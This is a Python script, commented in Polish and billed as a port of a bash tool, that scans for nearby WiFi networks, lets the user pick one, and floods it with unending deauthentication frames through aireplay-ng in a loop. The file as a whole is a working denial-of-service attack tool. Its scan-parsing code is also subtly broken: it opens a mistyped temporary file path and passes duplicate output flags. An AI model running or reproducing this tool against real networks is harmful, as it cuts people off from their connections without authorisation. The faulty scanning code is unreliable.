#!/usr/bin/env python3
# deauth.py - Python implementation of deauth.sh

import os
import sys
import time
import subprocess
import signal
import logging
from typing import List, Dict, Optional

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_RUNNING = "\033[31m" if COLOR_ENABLED else ""
COLOR_STOP = "\033[33m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""


def color_text(text: str, color: str) -> str:
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text: str, *styles: str) -> str:
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text


def run_command(cmd: List[str], check: bool = True, capture: bool = False) -> Optional[str]:
    """Uruchom komendę i zwróć output jeśli capture=True"""
    try:
        if capture:
            result = subprocess.run(cmd, check=check, capture_output=True, text=True)
            return result.stdout.strip()
        else:
            subprocess.run(cmd, check=check)
            return None
    except subprocess.CalledProcessError as e:
        logging.error(f"Command failed: {' '.join(cmd)}")
        logging.error(f"Error: {e}")
        if check:
            raise
        return None


def list_interfaces() -> List[str]:
    """Zwróć listę dostępnych interfejsów sieciowych"""
    interfaces = []
    try:
        # Używamy ip zamiast ifconfig (nowocześniejsze)
        result = run_command(["ip", "-o", "link", "show"], capture=True)
        if result:
            for line in result.split('\n'):
                if ': ' in line:
                    parts = line.split(': ')
                    if len(parts) > 1:
                        iface = parts[1].split(':')[0]
                        if iface and iface != 'lo':
                            interfaces.append(iface)
    except:
        # Fallback na ifconfig
        try:
            result = run_command(["ifconfig", "-a"], capture=True)
            if result:
                for line in result.split('\n'):
                    if line and not line.startswith(' ') and not line.startswith('\t'):
                        iface = line.split(':')[0].split()[0]
                        if iface and iface != 'lo':
                            interfaces.append(iface)
        except:
            pass
    
    return list(set(interfaces))  # Usuń duplikaty


def get_interface_info(interface: str) -> Dict[str, str]:
    """Pobierz informacje o interfejsie"""
    info = {"driver": "unknown", "chipset": "unknown", "mode": "unknown"}
    
    # Sprawdź tryb
    try:
        result = run_command(["iwconfig", interface], capture=True, check=False)
        if result:
            for line in result.split('\n'):
                if 'Mode:' in line:
                    info['mode'] = line.split('Mode:')[1].split()[0].strip()
    except:
        pass
    
    # Sprawdź driver/chipset przez ethtool
    try:
        result = run_command(["ethtool", "-i", interface], capture=True, check=False)
        if result:
            for line in result.split('\n'):
                if 'driver:' in line:
                    info['driver'] = line.split(':')[1].strip()
                if 'bus-info:' in line:
                    info['chipset'] = line.split(':')[1].strip()
    except:
        pass
    
    return info


def setup_monitor_mode(interface: str) -> bool:
    """Konfiguruj interfejs w trybie monitora - identycznie jak w bash"""
    try:
        logging.info(f"Taking interface {interface} down")
        run_command(["ifconfig", interface, "down"])
        
        logging.info(f"Enabling monitor mode on {interface}")
        run_command(["iwconfig", interface, "mode", "monitor"])
        
        logging.info(f"Getting interface {interface} up")
        run_command(["ifconfig", interface, "up"])
        
        return True
    except Exception as e:
        logging.error(f"Failed to setup monitor mode: {e}")
        return False


def scan_networks(interface: str, duration: int = 10) -> List[Dict[str, str]]:
    """Skanuj sieci WiFi"""
    networks = []
    
    # Najpierw upewnij się że interfejs jest w monitor mode
    try:
        run_command(["iwconfig", interface, "mode", "monitor"], check=False)
    except:
        pass
    
    # Użyj airodump-ng do skanowania
    temp_file = "/tmp/scan_output.csv"
    
    try:
        # Uruchom airodump-ng na krótko
        cmd = ["airodump-ng", interface, "--write", "/tmp/scan", "--output-format", "csv", "-w", "/tmp/scan"]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        logging.info(f"Scanning for {duration} seconds...")
        time.sleep(duration)
        
        # Zakończ proces
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except:
            proc.kill()
        
        # Odczytaj wyniki
        if os.path.exists("/tmp/scan-01.csv"):
            with open("/tmp-01.csv", "r", encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
            # Parsuj CSV
            lines = content.split('\n')
            in_ap_section = False
            
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                    
                if 'Station MAC' in line:
                    break  # Koniec sekcji AP
                    
                if 'BSSID' in line and 'channel' in line.lower():
                    in_ap_section = True
                    continue
                    
                if in_ap_section and line:
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        essid = parts[13].strip()
                        
                        if bssid and essid and channel:
                            networks.append({
                                'bssid': bssid,
                                'channel': channel,
                                'essid': essid
                            })
        
        # Sprzątanie
        for f in ["/tmp/scan-01.csv", "/tmp/scan-01.kismet.csv", "/tmp/scan-01.log.csv"]:
            if os.path.exists(f):
                os.remove(f)
                
    except Exception as e:
        logging.error(f"Scan failed: {e}")
        # Fallback na iw
        try:
            result = run_command(["iw", "dev", interface, "scan"], capture=True, check=False)
            if result:
                current_bssid = None
                current_channel = None
                current_essid = None
                
                for line in result.split('\n'):
                    line = line.strip()
                    if line.startswith('BSS'):
                        if current_bssid and current_essid and current_channel:
                            networks.append({
                                'bssid': current_bssid,
                                'channel': current_channel,
                                'essid': current_essid
                            })
                        
                        parts = line.split()
                        if len(parts) > 1:
                            current_bssid = parts[1]
                            current_channel = None
                            current_essid = None
                    
                    elif 'freq:' in line:
                        try:
                            freq = float(line.split(':')[1].strip())
                            if 2412 <= freq <= 2472:
                                current_channel = str(int((freq - 2412) / 5 + 1))
                            elif freq == 2484:
                                current_channel = '14'
                        except:
                            pass
                    
                    elif 'DS Parameter set:' in line and 'channel' in line:
                        try:
                            current_channel = line.split('channel')[1].strip()
                        except:
                            pass
                    
                    elif 'SSID:' in line:
                        current_essid = line.split(':', 1)[1].strip()
                        
    return networks


def select_interface() -> Optional[str]:
    """Wybierz interfejs z listy"""
    interfaces = list_interfaces()
    
    if not interfaces:
        logging.error("No network interfaces found!")
        return None
    
    logging.info(style("Available interfaces:", STYLE_BOLD))
    for i, iface in enumerate(interfaces, 1):
        info = get_interface_info(iface)
        logging.info(f"  {i}) {color_text(iface, COLOR_HIGHLIGHT)} - {info['driver']} ({info['mode']})")
    
    while True:
        try:
            choice = input(f"{style('Select interface', STYLE_BOLD)} (number or name): ").strip()
            
            if not choice:
                continue
                
            if choice.isdigit():
                idx = int(choice) - 1
                if 0 <= idx < len(interfaces):
                    return interfaces[idx]
            elif choice in interfaces:
                return choice
                
            logging.warning("Invalid selection. Try again.")
        except KeyboardInterrupt:
            return None


def select_network(interface: str) -> Optional[Dict[str, str]]:
    """Wybierz sieć do ataku"""
    logging.info("Scanning for networks...")
    networks = scan_networks(interface, 10)
    
    if not networks:
        logging.error("No networks found!")
        return None
    
    logging.info(style("Available networks:", STYLE_BOLD))
    for i, net in enumerate(networks[:20], 1):  # Pokaż tylko pierwsze 20
        logging.info(f"  {i}) {color_text(net['essid'], COLOR_HIGHLIGHT)} - {net['bssid']} (ch {net['channel']})")
    
    while True:
        try:
            choice = input(f"{style('Select network', STYLE_BOLD)} (number): ").strip()
            
            if choice.isdigit():
                idx = int(choice) - 1
                if 0 <= idx < len(networks):
                    return networks[idx]
                    
            logging.warning("Invalid selection. Try again.")
        except KeyboardInterrupt:
            return None


def set_channel(interface: str, channel: str) -> bool:
    """Ustaw kanał na interfejsie"""
    try:
        logging.info(f"Setting interface {interface} to channel {channel}")
        run_command(["iwconfig", interface, "channel", channel])
        return True
    except Exception as e:
        logging.error(f"Failed to set channel: {e}")
        return False


def run_deauth_loop(interface: str, channel: str, bssid: str) -> None:
    """Główna pętla deauth - identyczna logika jak w bash"""
    logging.info("=" * 60)
    logging.info(f"Starting deauth attack on {color_text(bssid, COLOR_RUNNING)}")
    logging.info(f"Interface: {interface}, Channel: {channel}")
    logging.info("=" * 60)
    logging.info(f"Press {style('Ctrl+C', STYLE_BOLD)} to stop")
    
    try:
        # Ustaw kanał
        if not set_channel(interface, channel):
            return
            
        logging.info("Waiting 3 seconds...")
        time.sleep(3)
        
        logging.info("Starting the deauth loop")
        
        failure_count = 0
        while True:
            try:
                logging.info(f"Running deauth to {bssid}")
                
                # Uruchom aireplay-ng z --deauth 0 (niekończące się)
                # Używamy Popen zamiast run żeby móc przechwycić Ctrl+C
                cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, interface]
                
                with subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                    text=True, preexec_fn=os.setsid) as proc:
                    
                    # Czekaj 10 sekund lub na zakończenie
                    for _ in range(10):
                        if proc.poll() is not None:
                            break
                        time.sleep(1)
                    
                    # Jeśli proces jeszcze działa, zabij go
                    if proc.poll() is None:
                        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                        proc.wait(timeout=2)
                
                failure_count = 0  # Resetuj licznik błędów po sukcesie
                time.sleep(1)  # Krótka przerwa między cyklami
                
            except subprocess.CalledProcessError as e:
                failure_count += 1
                logging.warning(f"Deauth failed (attempt {failure_count}): {e}")
                
                if failure_count >= 3:
                    logging.error("Too many failures. Stopping.")
                    break
                    
                time.sleep(2)  # Czekaj przed ponowną próbą
                
            except Exception as e:
                logging.error(f"Unexpected error: {e}")
                break
                
    except KeyboardInterrupt:
        logging.info(color_text("\nDeauth loop stopped by user", COLOR_STOP))
    except Exception as e:
        logging.error(f"Error in deauth loop: {e}")


def cleanup(interface: str) -> None:
    """Przywróć interfejs do trybu managed"""
    logging.info("Cleaning up...")
    
    try:
        run_command(["ifconfig", interface, "down"], check=False)
        run_command(["iwconfig", interface, "mode", "managed"], check=False)
        run_command(["ifconfig", interface, "up"], check=False)
    except:
        pass
    
    logging.info("Cleanup completed")


def check_tools() -> bool:
    """Sprawdź czy wymagane narzędzia są dostępne"""
    required_tools = ["ifconfig", "iwconfig", "aireplay-ng", "iw", "ip"]
    
    missing = []
    for tool in required_tools:
        if run_command(["which", tool], check=False, capture=True) is None:
            missing.append(tool)
    
    if missing:
        logging.error(f"Missing required tools: {', '.join(missing)}")
        logging.error("Install with: sudo apt install aircrack-ng wireless-tools")
        return False
    
    return True


def main_cli_mode() -> None:
    """Tryb CLI - jak oryginalny bash script"""
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <interface> <channel> <bssid>")
        print(f"Example: {sys.argv[0]} wlan1mon 6 AA:BB:CC:DD:EE:FF")
        sys.exit(1)
    
    interface = sys.argv[1]
    channel = sys.argv[2]
    bssid = sys.argv[3]
    
    if not check_tools():
        sys.exit(1)
    
    # Sprawdź czy interfejs istnieje
    interfaces = list_interfaces()
    if interface not in interfaces:
        logging.error(f"Interface {interface} not found!")
        logging.error(f"Available: {', '.join(interfaces)}")
        sys.exit(1)
    
    # Uruchom atak
    run_deauth_loop(interface, channel, bssid)
    cleanup(interface)


def main_interactive_mode() -> None:
    """Tryb interaktywny z menu"""
    logging.info(style("=" * 60, COLOR_HEADER))
    logging.info(style("        DEAUTH ATTACK TOOL (Python Edition)        ", COLOR_HEADER, STYLE_BOLD))
    logging.info(style("=" * 60, COLOR_HEADER))
    logging.info("")
    
    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)
    
    if not check_tools():
        sys.exit(1)
    
    while True:
        logging.info(style("Main Menu:", STYLE_BOLD))
        logging.info("  1) Scan and attack (interactive)")
        logging.info("  2) Direct attack (provide details)")
        logging.info("  3) Exit")
        
        choice = input(f"{style('Select option', STYLE_BOLD)}: ").strip()
        
        if choice == '1':
            # Tryb interaktywny
            interface = select_interface()
            if not interface:
                continue
                
            if not setup_monitor_mode(interface):
                logging.error("Failed to setup monitor mode!")
                continue
                
            network = select_network(interface)
            if not network:
                continue
                
            logging.info(style("Confirm attack:", STYLE_BOLD))
            logging.info(f"  Target: {color_text(network['essid'], COLOR_HIGHLIGHT)}")
            logging.info(f"  BSSID: {network['bssid']}")
            logging.info(f"  Channel: {network['channel']}")
            logging.info(f"  Interface: {interface}")
            
            confirm = input(f"{style('Proceed with attack?', STYLE_BOLD)} (y/N): ").strip().lower()
            if confirm == 'y':
                run_deauth_loop(interface, network['channel'], network['bssid'])
                cleanup(interface)
                
        elif choice == '2':
            # Tryb bezpośredni
            interface = input(f"{style('Interface', STYLE_BOLD)} (e.g., wlan1mon): ").strip()
            channel = input(f"{style('Channel', STYLE_BOLD)} (e.g., 6): ").strip()
            bssid = input(f"{style('BSSID', STYLE_BOLD)} (e.g., AA:BB:CC:DD:EE:FF): ").strip()
            
            if interface and channel and bssid:
                if not setup_monitor_mode(interface):
                    logging.error("Failed to setup monitor mode!")
                    continue
                    
                run_deauth_loop(interface, channel, bssid)
                cleanup(interface)
            else:
                logging.warning("All fields are required!")
                
        elif choice == '3':
            logging.info("Goodbye!")
            break
            
        else:
            logging.warning("Invalid option!")


def main():
    """Główna funkcja"""
    # Sprawdź czy podano argumenty CLI
    if len(sys.argv) > 1:
        main_cli_mode()
    else:
        main_interactive_mode()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info("\nExiting...")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        sys.exit(1)